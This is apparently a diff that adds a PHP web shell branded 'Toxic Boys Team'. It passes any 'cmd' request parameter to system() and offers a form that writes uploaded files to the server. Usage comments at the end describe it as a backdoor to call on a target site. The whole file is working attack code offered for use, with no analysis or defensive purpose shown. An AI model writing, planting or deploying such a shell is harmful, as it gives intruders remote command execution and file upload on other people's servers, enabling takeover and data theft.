@@ -1,0 +1,25 @@
+<?php
+
+if(isset($_REQUEST['cmd'])){
+        
+	    $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo '<title>Upload Files By Toxic Boys Team | Toxicmask.blogspot.com</title>';
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+	if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Upload Complate !!!</b><br><br>'; }
+	else { echo '<b>Upload Failed !!!</b><br><br>'; }
+	    die;
+		
+		
+
+}
+}
+
+?>
+
+// usage of backdoor //
+usage = www.targetsite.com/anypage.php?cmd=fahim
+// usage of backdoor // 
+
